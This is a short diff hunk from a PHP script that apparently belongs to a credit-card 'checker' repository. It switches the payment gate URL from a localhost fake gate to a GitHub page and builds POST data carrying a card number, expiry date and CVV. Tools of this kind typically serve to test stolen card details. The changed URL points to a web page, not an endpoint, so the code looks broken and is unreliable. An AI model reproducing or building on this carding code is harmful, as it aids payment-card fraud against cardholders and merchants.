@@ -66,7 +66,7 @@
 
 					*/
 
-					$payment_url = 	"http://localhost/site/fake-gate.php";	
+					$payment_url = 	"https://github.com/famousxhacker/cc-checker/blob/main/fake-gate.php";	
 					$postdata = "cardnumber=$card&mouth=$month&year=$year&cvv=$cvv&buy=Buy";
 					$success_message = "Paid successfully!";
 
